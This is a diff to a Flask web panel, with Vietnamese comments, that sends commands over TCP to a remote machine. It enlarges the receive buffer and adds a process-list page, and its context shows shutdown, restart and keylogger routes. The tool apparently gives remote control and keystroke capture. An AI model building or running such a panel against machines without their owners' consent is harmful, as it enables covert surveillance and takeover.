@@ -13,7 +13,8 @@ def send_tcp_command(cmd):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((TCP_SERVER_IP, TCP_PORT))
             s.sendall(cmd.encode())
-            result = s.recv(4096).decode()
+            # Tăng buffer lên 16384 bytes để chứa đủ danh sách process
+            result = s.recv(16384).decode() 
         return result
     except Exception as e:
         return f"[ERROR] {e}"
@@ -45,6 +46,12 @@ def shutdown_page():
 @app.route("/restart")
 def restart_page():
     return render_template("index.html", title="Restart System", mode="restart")
+
+@app.route("/processes")
+def processes_page():
+    # Gửi lệnh ngay khi vào trang để lấy dữ liệu
+    process_data = send_tcp_command("list_processes")
+    return render_template("index.html", title="Task Manager", mode="processes", process_list=process_data)
 
 @app.route("/keylogger")
 def keylogger_page():
